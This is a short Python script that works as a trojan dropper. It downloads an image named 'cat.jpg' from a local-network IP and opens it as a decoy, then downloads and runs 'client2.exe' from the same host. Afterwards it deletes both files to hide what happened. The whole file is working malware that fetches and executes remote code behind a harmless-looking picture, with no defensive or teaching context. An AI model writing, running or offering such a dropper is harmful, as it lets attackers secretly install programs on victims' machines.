import tempfile
import requests
import subprocess
import os


def download(url):
    response = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as f:
        f.write(response.content)


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://192.168.2.129/files/cat.jpg")
subprocess.Popen("cat.jpg", shell=True)

download("http://192.168.2.129/files/client2.exe")
subprocess.call("client2.exe", shell=True)

os.remove("cat.jpg")
os.remove("client2.exe")
